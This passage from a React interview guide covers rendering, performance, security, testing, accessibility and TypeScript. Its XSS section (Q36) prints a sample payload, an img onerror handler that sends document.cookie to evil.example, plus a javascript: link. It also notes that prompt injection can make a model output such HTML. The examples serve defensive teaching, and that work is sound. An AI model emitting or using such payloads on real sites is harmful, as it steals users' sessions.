**Common mistake → fix:** forgetting the server side. Refreshing `/docs/42` asks the **server** for that path; a static host returns 404 unless it's configured to serve `index.html` for unknown paths (SPA fallback — see Vite Q24).

**Interview answer:** "The router maps URLs to component trees, with nested routes for shared layouts. I keep shareable state like IDs and filters in the URL so refresh and links work, and I make sure the host serves index.html for client routes."

**Follow-ups:**
- *How do you protect routes?* Redirect unauthenticated users in a loader or layout for UX, but the API must still check permissions on every request.

---

## 6. Performance

### Q32. Reconciliation and how component identity affects state

**Short answer:** When React compares the new UI with the old one (**reconciliation**), it decides whether a component is "the same one" by its **position in the tree, its type, and its key**. Same position + same type + same key → React keeps its state and just updates its props. Change any of those → React destroys the old component (losing its state) and creates a new one.

**Example:**
```jsx
function Page({ isEditing, sessionId }) {
  return (
    <div>
      {isEditing ? <Editor /> : <Viewer />}      {/* different types → state lost when switching */}
      <Chat key={sessionId} />                   {/* new sessionId → new Chat with fresh state */}
    </div>
  );
}
```

```flow
trace: Same spot, different outcomes
before: <div><Counter count=3 /></div>  after: <div><Counter count=3 /></div> > Same type in the same position, so React keeps the Counter and its internal state. Only props are updated.
before: <div><Counter /></div>  after: <section><Counter /></section> > The parent element type changed from div to section, so React throws away the whole subtree. Counter starts over from its initial state.
before: <Chat key="s1" />  after: <Chat key="s2" /> > A different key means a different component. React unmounts the s1 chat and mounts a fresh s2 chat, which is a clean way to reset state.
```

**Common mistake → fix:** defining a component **inside** another component.
```jsx
function Parent() {
  function Row() { return <input />; }   // ❌ a NEW component type every render
  return <Row />;                        //    → the input is destroyed and recreated each render (loses focus and text)
}
```
Define components at the top level of the module.

**Interview answer:** "React decides whether to keep or recreate a component by its position, type and key. If they match, state is preserved; if not, the subtree is remounted. I use that deliberately — changing a `key` resets a component — and I never define components inside other components, because that creates a new type every render."

**Follow-ups:**
- *Why is diffing O(n) and not O(n³)?* React assumes different types produce different trees and uses keys for lists, so it can compare level by level.

---

### Q33. How do you diagnose unnecessary re-renders?

**Short answer:** Measure first with the **React DevTools Profiler**, find which components re-render and **why**, then fix the cause — usually state that lives too high, a context value that changes every render, or new objects/functions passed as props.

**Step by step:**
1. **Record** an interaction in the Profiler tab (e.g. typing in a search box). Turn on "Highlight updates when components render" to see flashes.
2. **Look at the flamegraph:** which components rendered, and how long each took. Grey components didn't render.
3. **Check "Why did this render?"** (enable it in Profiler settings): it says "props changed: onSelect", "context changed", "parent rendered", or "state changed".
4. **Fix the cause:**
   - State too high → move it down into the component that uses it.
   - Context value recreated every render → memoise it or split the context.
   - New object/function props to a memoised child → `useMemo` / `useCallback`, or let the React Compiler handle it.
   - Expensive child with unchanged props → wrap it in `React.memo`.
5. **Record again** and confirm render counts and times dropped.

**Example:**
```jsx
// Before: typing re-renders the whole page, including a 2,000-row table
function Page() {
  const [search, setSearch] = useState("");
  return <><input value={search} onChange={e => setSearch(e.target.value)} /><HugeTable /></>;
}

// After: the search box owns its own state; HugeTable no longer re-renders on each keystroke
function SearchBox() {
  const [search, setSearch] = useState("");
  return <input value={search} onChange={e => setSearch(e.target.value)} />;
}
function Page() { return <><SearchBox /><HugeTable /></>; }
```

**Interview answer:** "I don't guess — I profile with React DevTools, check why each component rendered, and fix the cause: move state down, stabilise context values, memoise props for expensive memoised children. Then I measure again. Re-renders are only a problem if they're slow or very frequent."

**Follow-ups:**
- *Are re-renders bad in general?* No. Most are cheap. Optimise the ones that show up as slow in the profiler.

---

### Q34. Rendering long lists and streaming LLM text efficiently

**Short answer:** For long lists, **virtualise**: only render the ~30 rows visible on screen and swap them as the user scrolls. For streaming LLM tokens, keep the changing text **in the one message component that displays it**, and **batch** tokens (e.g. update every ~50 ms) instead of re-rendering on every single token.

**Example — streaming tokens without re-rendering the whole app:**
```jsx
function StreamingMessage({ streamUrl }) {
  const [text, setText] = useState("");
  const bufferRef = useRef("");

  useEffect(() => {
    const source = new EventSource(streamUrl);
    source.onmessage = e => { bufferRef.current += JSON.parse(e.data).token; };   // collect, don't render yet
    const timer = setInterval(() => setText(bufferRef.current), 50);              // render at most 20×/s
    return () => { source.close(); clearInterval(timer); };
  }, [streamUrl]);

  return <Markdown>{text}</Markdown>;
}
```

**What happens:**
1. Tokens may arrive 50–100 times per second. Each one is appended to a ref, which doesn't trigger a render.
2. Every 50 ms, the component renders once with all tokens so far, which is smooth to the eye.
3. Only `StreamingMessage` re-renders. The message list, sidebar and input don't, because the token state isn't stored above them.

**Example — virtualising 10,000 rows:**
```jsx
const virtualizer = useVirtualizer({ count: rows.length, getScrollElement: () => parentRef.current, estimateSize: () => 36 });
// render only virtualizer.getVirtualItems() — about 20–40 DOM rows instead of 10,000
```

**Common mistake → fix:** storing streamed tokens in a top-level context or store that the whole app reads. Every token then re-renders every consumer and the UI stutters (see Q43).

**Interview answer:** "For long lists I virtualise with TanStack Virtual so only visible rows are in the DOM. For streaming I keep token state local to the streaming message, buffer tokens in a ref and flush on a short interval, and memoise the rest of the list, so each token updates one small component."

**Follow-ups:**
- *Markdown re-parsing on every flush?* Parse only the active message and keep completed messages memoised.

---

### Q35. Bundle size and load performance

**Short answer:** Send less JavaScript up front, and make the rest cacheable. Measure the bundle, **lazy-load** heavy features, import only what you use, and serve files with content-hashed names so browsers can cache them for a long time.

**Step by step:**
1. **Measure:** run a bundle visualiser (e.g. `rollup-plugin-visualizer` with Vite) and check Web Vitals (LCP, INP) in Lighthouse.
2. **Split:** lazy-load routes and heavy widgets (PDF viewer, charts, code editor) with `React.lazy` + `Suspense`.
3. **Import less:** `import { debounce } from "lodash-es"` instead of the whole library; replace heavy libraries (moment → date-fns or `Intl`); drop unused locales and icon packs.
4. **Cache:** hashed file names (`app-4f9c.js`) with `Cache-Control: immutable`, so returning users download nothing.
5. **Prioritise:** preload what the first screen needs; defer everything else.

**Example:**
```jsx
// ❌ the chart library (300 KB) is in the main bundle even for users who never open Reports
import { LineChart } from "heavy-charts";

// ✅ loaded only when the Reports route renders
const Reports = lazy(() => import("./routes/Reports"));
```

**Interview answer:** "I measure with a bundle analyser, lazy-load routes and heavy components, import only what's needed, and rely on hashed filenames for long-term caching. I set a bundle-size budget in CI so it doesn't creep back up."

**Follow-ups:**
- *What metrics matter?* LCP (main content visible), INP (responsiveness to input), CLS (layout shifts).

---

## 7. Security, testing, accessibility

### Q36. Preventing XSS, especially with LLM output

**Short answer:** **XSS** (cross-site scripting) is when an attacker gets their JavaScript to run in your users' browsers, letting them steal sessions or act as the user. React protects you by default: anything you put in `{text}` is shown as text, not run as HTML. The danger comes when you bypass that — `dangerouslySetInnerHTML`, rendering Markdown/HTML, or `href={url}` with a `javascript:` URL. Treat **LLM output as untrusted**: a prompt injection can make the model produce malicious HTML.

**Example:**
```jsx
const answer = '<img src=x onerror="fetch(`https://evil.example/?c=`+document.cookie)">';

<p>{answer}</p>                                          // ✅ shown as harmless text
<div dangerouslySetInnerHTML={{ __html: answer }} />    // ❌ the onerror script runs

// ✅ if you must render HTML/Markdown: disable raw HTML in the Markdown renderer, then sanitise
import DOMPurify from "dompurify";
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(marked.parse(answer)) }} />
```

**What happens in the ❌ case:**
1. The model was tricked (or a retrieved document contained this text) into returning an `<img>` tag with an `onerror` handler.
2. `dangerouslySetInnerHTML` inserts it as real HTML. The image fails to load (`src=x`), so `onerror` runs.
3. The script sends the user's cookies to the attacker. DOMPurify removes `onerror` and other dangerous attributes before insertion.

**Also check links:**
```jsx
<a href={userProvidedUrl}>open</a>          // ❌ "javascript:alert(1)" runs code when clicked
const safe = /^https?:\/\//.test(url) ? url : "#";   // ✅ allow only http(s)
```

**Defence in depth:** a strict Content-Security-Policy header (set by your host or CDN) blocks inline and third-party scripts even if something slips through; keep tokens in memory or httpOnly cookies, not `localStorage`.

**Interview answer:** "React escapes text by default, so XSS comes from bypassing it — dangerouslySetInnerHTML, Markdown/HTML rendering, or unsafe URLs. I treat LLM output and retrieved content as untrusted: Markdown with raw HTML disabled, DOMPurify sanitisation, http(s)-only links, and a strict CSP as a backstop."

**Follow-ups:**
- *Why is LLM output special?* Its content can be steered by attackers through prompt injection, so it's effectively user input.

---

### Q37. Authentication vs authorisation in a React app

**Short answer:** **Authentication** = proving who you are (logging in, getting a token). **Authorisation** = deciding what you're allowed to do. In a React app, the frontend uses auth information only to **improve the experience** (hide buttons, redirect to login). The **real checks must happen on the server** on every request, because anyone can call your API directly or change the JavaScript in their browser.

**Example:**
```jsx
function DocumentActions({ doc, user }) {
  return (
    <>
      <button>Open</button>
      {user.role === "admin" && <button onClick={() => api.deleteDoc(doc.id)}>Delete</button>}
    </>
  );
}
```
```flow
sequence: Hiding the button is not security
actors: Viewer user, React app, API
Viewer user -> React app: logs in, role is viewer, so the Delete button is hidden
Viewer user -> API: sends DELETE /docs/42 directly (browser devtools or curl, with their token)
API -> API: verifies the token and checks: may this user delete doc 42?
API --> Viewer user: 403 Forbidden
> The hidden button only improved the UI. The server-side permission check is what actually stopped the delete.
```

**Login flow for a SPA (short):** use **OpenID Connect with PKCE** through your identity provider (Okta, Cognito, Entra). The app receives an access token, sends it as `Authorization: Bearer …` to your API, and the API verifies it and checks permissions.

**Common mistake → fix:** storing long-lived tokens in `localStorage`, where any XSS can read them. Prefer short-lived access tokens kept in memory, with refresh handled by the identity provider's SDK or an httpOnly-cookie-based backend (BFF).

**Interview answer:** "Authentication establishes identity; authorisation decides permissions. The React app uses identity for UX — showing or hiding actions — but the API enforces authorisation on every request, because the client can't be trusted. For login I use OIDC with PKCE and short-lived tokens."

**Follow-ups:**
- *What's PKCE?* A one-time secret the app generates per login so that a stolen authorisation code can't be exchanged for tokens by someone else.

---

### Q38. Testing React at multiple layers

**Short answer:** Test like a user would. **Unit tests** for pure logic (reducers, helpers, hooks with `renderHook`); **component tests** with React Testing Library — render, click and type, then check what's visible; **mock the network** with MSW so tests don't hit real APIs; and a few **end-to-end tests** with Playwright for the critical journeys in a real browser.

**Example — component test with a mocked API failure:**
```jsx
import { render, screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { http, HttpResponse } from "msw";
import { server } from "./mocks/server";

test("shows a retry button when the upload fails", async () => {
  server.use(http.post("/api/upload", () => new HttpResponse(null, { status: 500 })));   // force a failure

  render(<Uploader />);
  await userEvent.upload(screen.getByLabelText(/choose file/i), new File(["x"], "a.pdf"));

  expect(await screen.findByRole("button", { name: /retry/i })).toBeInTheDocument();
});
```

**What the test does, step by step:**
1. MSW intercepts `POST /api/upload` and returns HTTP 500, so we test the error path without a real server.
2. `render` mounts the component; `userEvent.upload` simulates a real user picking a file (events fire like in a browser).
3. `findByRole` waits until a button named "Retry" appears — querying by role and name is how a screen-reader user finds it, so the test also checks accessibility.

**Common mistake → fix:** testing implementation details (state variable values, internal function calls, CSS class names). Those tests break on every refactor even when the behaviour is fine. Assert what the user sees and can do.

**Interview answer:** "I use a pyramid: unit tests for pure logic and hooks, React Testing Library component tests that interact like a user, MSW to mock the API including error responses, and a small set of Playwright tests for critical flows. I query by role and label so tests reflect real usage and catch accessibility issues."

**Follow-ups:**
- *Snapshot tests?* Only for small, stable output; large snapshots get approved without being read.

---

### Q39. Accessibility basics

**Short answer:** Accessibility (a11y) means people using keyboards, screen readers or zoom can use your app. The basics cover most of it: use **real HTML elements** (`<button>`, `<a>`, `<label>`), make **everything work with the keyboard** with a visible focus outline, give every input a **label** and every image **alt text**, use enough **colour contrast**, and announce dynamic updates.

**Example:**
```jsx
// ❌ looks like a button, but isn't focusable, has no role, and Enter/Space do nothing
<div className="btn" onClick={save}>Save</div>

// ✅ keyboard and screen-reader support for free
<button onClick={save}>Save</button>

// ✅ inputs need labels
<label htmlFor="email">Email</label>
<input id="email" type="email" />

// ✅ announce async results (e.g. "3 results" or an error) to screen readers
<p role="status" aria-live="polite">{results.length} results</p>
```

**What changes for a keyboard user with the ✅ version:** they can Tab to the button, see where focus is, press Enter or Space to save, and a screen reader announces "Save, button". With the `<div>` they can't reach it at all.

**Checklist for modals and menus:** move focus into the dialog when it opens, trap Tab inside it, close on Escape, and return focus to the button that opened it.

**Interview answer:** "I start with semantic HTML, which gives keyboard and screen-reader support for free, then make sure everything is keyboard-reachable with visible focus, inputs are labelled, images have alt text, contrast is sufficient, and dynamic changes are announced. I test with axe in CI and a quick keyboard and screen-reader pass."

**Follow-ups:**
- *When do you use ARIA?* Only when no native element fits (e.g. a custom tabs widget). Wrong ARIA is worse than none.

---

### Q40. Environment variables and config in a React SPA

**Short answer:** Everything in a browser app's JavaScript **can be read by anyone** who opens DevTools. Build-time variables (`import.meta.env.VITE_API_URL`) are copied into the bundle as plain text, so they're fine for **public** settings like an API URL or feature flags, but **never for secrets** (API keys, client secrets). Secrets stay on your backend, which the app calls.

**Example:**
```js
// vite build replaces this with the literal string, e.g. "https://api.example.com"
const apiUrl = import.meta.env.VITE_API_URL;

// ❌ this key ends up in dist/assets/index-*.js for anyone to copy
const openAiKey = import.meta.env.VITE_OPENAI_KEY;
```

**Better for multiple environments — runtime config:** build once, and load a small `config.json` at startup that differs per environment.
```js
const config = await fetch("/config.json").then(r => r.json());   // { "apiUrl": "https://api.staging…" }
```
This way the exact bundle you tested in staging is what you deploy to production.

**Interview answer:** "Anything shipped to the browser is public, so build-time env vars are only for non-secret config. Secrets stay on the server and the SPA calls our API instead. To deploy one build to many environments, I load a small runtime config file at startup instead of rebuilding per environment."

**Follow-ups:**
- *Can feature flags in the bundle protect a feature?* No — they can hide UI, but the server must still enforce access.

---

## 8. Scenario & debugging questions

### Q41. A chat view shows messages from the previous session after switching. What do you inspect?

**Short answer:** Old data leaking into a new session almost always comes from one of five places: a stream that wasn't closed, a cache key missing the session ID, component state that survived the switch, a late response from the old session, or a missing ownership check on the server. Check them in this order.

**Step by step:**
1. **Effect cleanup.** Does the effect that opens the SSE/WebSocket return `() => source.close()`, and is `sessionId` in its dependencies? *How to check:* DevTools → Network: after switching, is the old stream still open? If yes, old messages are still arriving.
2. **Cache keys.** Does the query key include the session (and tenant)? `["messages"]` is shared by every session; it must be `["messages", sessionId]`.
3. **Component identity.** Is the chat component reused between sessions and keeping its local state (draft, message list)? Fix: `<Chat key={sessionId} />` to give each session a fresh component.
4. **Late responses.** Can a slow request for session A finish after switching to B and write into B's state? Abort it in cleanup, or check the ID before setting state.
5. **Server side.** Does the API verify that the session belongs to this user? If the UI can show another user's data, that's a security bug, not just a UI bug.

**Example fix bundle:**
```jsx
<ChatView key={sessionId} sessionId={sessionId} />

function ChatView({ sessionId }) {
  const { data: history } = useQuery({ queryKey: ["messages", sessionId], queryFn: () => api.messages(sessionId) });
  useEffect(() => {
    const s = new EventSource(`/api/sessions/${sessionId}/stream`);
    s.onmessage = …;
    return () => s.close();
  }, [sessionId]);
  …
}
```

**Interview answer:** "I check effect cleanup for the stream, query keys that must include the session ID, whether the component should be keyed by session to reset its state, whether late responses can overwrite the new session, and finally whether the server enforces session ownership. The fix is usually a key, a cleanup and a correct query key."

---

### Q42. Design a UI for a long-running job (e.g., document extraction)

**Short answer:** Start the job with one request that returns a **job ID immediately** (`202 Accepted`), then show **live progress** from the server (SSE, or polling as a fallback), and make the **server the source of truth** so a page refresh or a second tab shows the same status. Handle every state: queued, running, partly done, done, failed (with retry) and cancelled.

**Example:**
```jsx
function ExtractionJob({ jobId }) {
  const { data: job } = useQuery({
    queryKey: ["job", jobId],
    queryFn: () => api.getJob(jobId),
    refetchInterval: q => (["done", "failed", "cancelled"].includes(q.state.data?.status) ? false : 3000),
  });

  if (!job) return <Spinner />;
  switch (job.status) {
    case "queued":    return <p>Waiting to start…</p>;
    case "running":   return <ProgressBar value={job.progress} label={`${job.pagesDone}/${job.pages} pages`} />;
    case "done":      return <a href={job.resultUrl}>Download results</a>;
    case "failed":    return <ErrorBox msg={job.error} onRetry={() => api.retry(jobId)} />;
    case "cancelled": return <p>Cancelled</p>;
  }
}
```

```flow
sequence: A job that survives a page refresh
actors: React, API
React -> API: POST /jobs with the file reference
API --> React: 202 Accepted with jobId (the job is saved first)
React -> API: subscribe to progress for jobId (SSE), or poll every 3 s
API --> React: running, 4 of 20 pages done
React -> React: user refreshes the page
React -> API: GET /jobs/{jobId}
API --> React: running, 9 of 20 pages done
> Because the server stores the job, the UI simply re-reads the current status after a refresh. Nothing important lives only in browser memory.
```

**Interview answer:** "The API returns a job ID immediately and stores the job, the UI subscribes to progress via SSE with polling as fallback, and on reload it re-reads the job from the server. I design every state explicitly — queued, running with progress, done, failed with retry, cancelled — and put the job ID in the URL so the page can be shared or reopened."

---

### Q43. A page re-renders the whole app on every streamed token. Fix?

**Short answer:** The streamed text is stored too high — usually in a top-level context or store that the whole app reads — so every token re-renders everything. Move the token state down into the **single message component** that displays it (or use a store with selectors), buffer tokens, and memoise the rest of the message list.

**Step by step:**
1. **Confirm it:** React DevTools Profiler → record while streaming → you'll see the header, sidebar and every message re-render per token, and "context changed" as the reason.
2. **Find the owner:** e.g. `ChatContext` holds `{ messages, streamingText, setStreamingText }`, and every component using `ChatContext` re-renders on each token.
3. **Move the state down:** keep `streamingText` inside `<StreamingMessage>` (see Q34). When the stream finishes, append the final message to the list once.
4. **Memoise finished messages:** `const MessageItem = React.memo(…)` so completed messages don't re-render while a new one streams.
5. **Buffer:** update the display every ~50 ms instead of per token.
6. **Measure again:** only `StreamingMessage` should flash in the profiler.

**Interview answer:** "I profile to confirm, then find that the token state lives in a context the whole app reads. I move it into the streaming message component, buffer updates, and memoise completed messages, so each token re-renders one small component instead of the whole tree."

---

### Q44. Users report the app is "frozen" while typing in a filter over 10k rows

**Short answer:** Each keystroke re-renders 10,000 rows on the main thread, and the browser can't process the next keystroke until that finishes. Fix it in this order: **virtualise** the list, make the filtering **non-urgent** (`useDeferredValue` / `useTransition`), **memoise** the filtering, and if needed move the work **off the main thread**.

**Example:**
```jsx
function FilterableList({ rows }) {
  const [filter, setFilter] = useState("");
  const deferredFilter = useDeferredValue(filter);                    // typing stays urgent
  const visible = useMemo(
    () => rows.filter(r => r.name.toLowerCase().includes(deferredFilter.toLowerCase())),
    [rows, deferredFilter]
  );
  return (
    <>
      <input value={filter} onChange={e => setFilter(e.target.value)} />
      <VirtualList items={visible} rowHeight={36} />                  {/* renders ~30 DOM rows */}
    </>
  );
}
```

**Why each step helps:**
1. **Virtualisation** cuts the rendering from 10,000 rows to about 30 — usually the biggest win by far.
2. **`useDeferredValue`** lets React update the input first and render the list afterwards, interruptibly.
3. **`useMemo`** avoids re-filtering when nothing relevant changed.
4. **Web Worker or server-side filtering** helps if filtering itself is expensive (fuzzy search on large data).

**Interview answer:** "Rendering 10k rows per keystroke blocks the main thread. I virtualise the list first, then defer the filtered value so input stays responsive, memoise the filtering, and move heavy filtering to a worker or the server if it's still slow. I'd confirm with the profiler before and after."

---

### Q45. What do you check in a frontend PR before release?

**Short answer:** A short checklist covering correctness, user experience, security and operability.

| Area | What to check |
|---|---|
| State | Single source of truth (no state duplicated from props/server); derived values computed, not stored |
| Effects | Each effect has cleanup and correct dependencies; no effect that should be an event handler |
| UI states | Loading, empty, error and retry states exist; long operations show progress |
| Data | Query keys include every input; requests are cancelled when inputs change |
| Security | No `dangerouslySetInnerHTML` without sanitising; no secrets in env vars; server enforces permissions |
| Accessibility | Semantic elements, labels, keyboard support, focus handling in dialogs |
| Performance | No large new dependencies; heavy features lazy-loaded; bundle budget passes |
| Tests | Behaviour tests for new logic; an error-path test |
| Release | Behind a feature flag if risky; monitoring/error tracking in place; rollback plan |

**Interview answer:** "I review state ownership and effects first, then loading, empty and error states, request cancellation and cache keys, XSS and secret handling, accessibility, bundle impact and tests — and for risky changes I want a feature flag and a rollback plan."

---

## 9. React with TypeScript

### Q46. How do you type React components, state and events?

**Short answer:** Describe each component's **props** with a `type` (or `interface`), let TypeScript **infer** state types where it can, add a type argument only when it can't guess (for example, state that starts as `null`), and model UI states as a **discriminated union** so impossible combinations don't compile.

**Example — props, state, events, refs:**
```tsx
type ButtonProps = {
  label: string;
  variant?: "primary" | "danger";                   // optional, only these two strings allowed
  onClick: () => void;
};

export function Button({ label, variant = "primary", onClick }: ButtonProps) {
  return <button className={variant} onClick={onClick}>{label}</button>;
}

const [count, setCount] = useState(0);                       // inferred as number
const [user, setUser] = useState<User | null>(null);         // can't be inferred from null → state it
const inputRef = useRef<HTMLInputElement>(null);

function handleChange(e: React.ChangeEvent<HTMLInputElement>) {
  setQuery(e.target.value);                                  // e.target is typed as an input
}
```

**Example — a discriminated union for a job's state:**
```tsx
type JobState =
  | { status: "idle" }
  | { status: "running"; progress: number }
  | { status: "done"; resultUrl: string }
  | { status: "failed"; error: string };

function JobView({ job }: { job: JobState }) {
  switch (job.status) {
    case "running": return <ProgressBar value={job.progress} />;   // TS knows progress exists here
    case "done":    return <a href={job.resultUrl}>Download</a>;
    case "failed":  return <p role="alert">{job.error}</p>;
    case "idle":    return null;
  }
}
```

**What TypeScript does for you here:**
1. `status` is the field that tells the variants apart.
2. Inside `case "running"`, TypeScript narrows `job` to the running variant, so `job.progress` is allowed and `job.resultUrl` is a compile error.
3. You can't create `{ status: "done" }` without a `resultUrl`, or "running" with an error — impossible states can't be written.

**Common mistakes → fixes:**
- `any` turns type checking off. Use `unknown` for untrusted data and narrow it (or validate it with Zod).
- API types drifting from the backend → generate TypeScript types from the FastAPI OpenAPI schema (e.g. `openapi-typescript`).
- Vite doesn't type-check; it only strips types. Run `tsc --noEmit` in CI.

**Interview answer:** "I type props explicitly, let inference handle most state, add generics when inference can't work, and use discriminated unions for UI states so impossible combinations don't compile. I generate API types from the backend's OpenAPI schema and validate untrusted runtime data, because TypeScript types disappear at runtime."

**Follow-ups:**
- *`type` or `interface` for props?* Either works. `interface` can be extended or merged; `type` handles unions. Pick one convention for the team.
- *Children type?* `children: React.ReactNode` accepts anything renderable.

---

## 10. Cheat sheet

| Concept | Remember |
|---|---|
| UI = f(state) | Change state; React updates the screen |
| setState | Queues an update; the new value appears in the **next** render; `console.log` right after shows the old value |
| Updater form | `setCount(c => c + 1)` when the next value depends on the previous one |
| Immutability | New object/array for every update (`{...obj}`, `[...arr]`) |
| Derived values | Calculate during render; don't store in state |
| Keys | Stable IDs from data; index keys move state to the wrong row |
| Rules of Hooks | Top level, same order every render (state is matched by position) |
| useEffect | Sync with outside systems; cleanup runs before the next run and on unmount |
| Not an effect | Derived values, user-event logic, resets (`key`), fetching (use a query library) |
| useRef | Persists, no re-render; DOM nodes and timer IDs |
| memo hooks | Performance only; profile first; React Compiler can automate |
| Context | App-wide, low-frequency values; every consumer re-renders on change |
| Stale closure | Old render's values captured; fix with updater, deps or useEffectEvent |
| Transitions | Mark non-urgent updates so typing stays responsive |
| React 19 | Actions, useActionState, useFormStatus, useOptimistic, use(), ref as a prop |
| React 19.2 | `<Activity>` keeps hidden UI state; useEffectEvent |
| Error boundary | Catches render errors only, not event/async errors |
| Security | `{}` escapes; sanitise HTML; LLM output is untrusted; the server authorises |
| TypeScript | Typed props, inferred state, discriminated unions, `tsc --noEmit` in CI |

## Official references

- https://react.dev/learn · https://react.dev/reference/react
- https://react.dev/learn/state-as-a-snapshot · https://react.dev/learn/queueing-a-series-of-state-updates
- https://react.dev/learn/you-might-not-need-an-effect
- https://react.dev/reference/react/Activity · https://react.dev/reference/react/useEffectEvent
- https://react.dev/blog (React 19, 19.2, React Compiler 1.0)
- https://tanstack.com/query/latest · https://testing-library.com/docs/react-testing-library/intro
